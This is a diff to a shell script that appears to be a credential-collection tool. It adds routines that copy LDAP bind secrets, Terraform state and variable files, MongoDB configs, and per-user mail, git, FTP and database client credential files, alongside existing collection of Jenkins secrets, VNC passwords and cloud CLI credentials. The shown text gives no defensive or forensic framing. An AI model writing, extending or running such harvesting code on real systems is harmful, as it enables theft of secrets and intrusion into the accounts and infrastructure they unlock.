@@ -125,6 +125,21 @@ cp_find "*.conf" /etc/kubernetes
 cp_find "*.sql" /var/www /srv /opt /var/backups /root /home
 cp_find "*.bak" /var/www /srv /opt /var/backups /root /home
 
+# ================= MAIL / GIT / TF / MONGO / LDAP / FTP (extra.py) =======
+cp_one /etc/msmtprc
+cp_one /etc/nslcd.conf
+cp_one /etc/ldap.conf
+cp_one /etc/ldap/ldap.conf
+cp_one /etc/openldap/ldap.conf
+cp_one /etc/ldap.secret
+cp_one /etc/libnss-ldap.secret
+cp_one /etc/pam_ldap.secret
+cp_find "mongod.conf" /etc /opt /srv
+cp_find "mongo.conf"  /etc /opt /srv
+cp_find "*.tfstate"   /opt /srv /home /root /var/lib
+cp_find "*.tfstate.backup" /opt /srv /home /root /var/lib
+cp_find "*.tfvars"    /opt /srv /home /root /var/lib
+
 # ================= CI / CONFIG-MGMT (apps.py) ===========================
 # jenkins secrets, ansible vaults, tomcat users - read by the apps collector
 cp_dir /var/lib/jenkins/secrets
@@ -160,6 +175,15 @@ for h in $HOMES; do
     for rc in .bashrc .bash_profile .zshrc .profile .bash_login .kshrc .cshrc \
               .mylogin.cnf .vnc/passwd .vnc/passwdfile; do
         cp_one "$h/$rc"
+    done
+    # mail / git / mongo / ftp client stores (extra.py)
+    for e in .msmtprc .config/msmtp/config .muttrc .mutt/muttrc \
+             .config/mutt/muttrc .neomuttrc .config/neomutt/neomuttrc \
+             .fetchmailrc .config/fetchmail/fetchmailrc \
+             .git-credentials .config/git/credentials .gitconfig \
+             .mongorc.js .mongoshrc.js .dbshell \
+             .local/share/lftp/bookmarks .lftp/bookmarks .ncftp/bookmarks; do
+        cp_one "$h/$e"
     done
     # cloud / cli / dev creds
     for c in .aws/credentials .aws/config .azure/accessTokens.json \
